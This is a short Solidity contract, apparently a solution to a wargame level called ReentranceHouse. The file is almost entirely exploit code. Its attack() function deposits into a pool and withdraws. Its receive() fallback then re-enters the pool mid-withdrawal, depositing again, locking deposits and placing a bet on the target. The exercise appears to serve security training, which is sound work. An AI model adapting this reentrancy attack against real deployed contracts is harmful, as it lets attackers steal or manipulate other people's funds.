// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ReentranceHouse, Pool, PoolToken} from "../levels/ReentranceHouse.sol";

contract ReentranceHouseAttack {
    ReentranceHouse target;
    Pool pool;
    PoolToken depositToken;
    address bettor;

    constructor(address target_, address payable pool_, address depositToken_) payable {
        target = ReentranceHouse(target_);
        pool = Pool(pool_);
        depositToken = PoolToken(depositToken_);
        bettor = msg.sender;
    }

    function attack() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit{value: 0.001 ether}(5);
        pool.withdrawAll();
    }

    receive() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit(5);
        pool.lockDeposits();
        target.makeBet(bettor);
    }
}
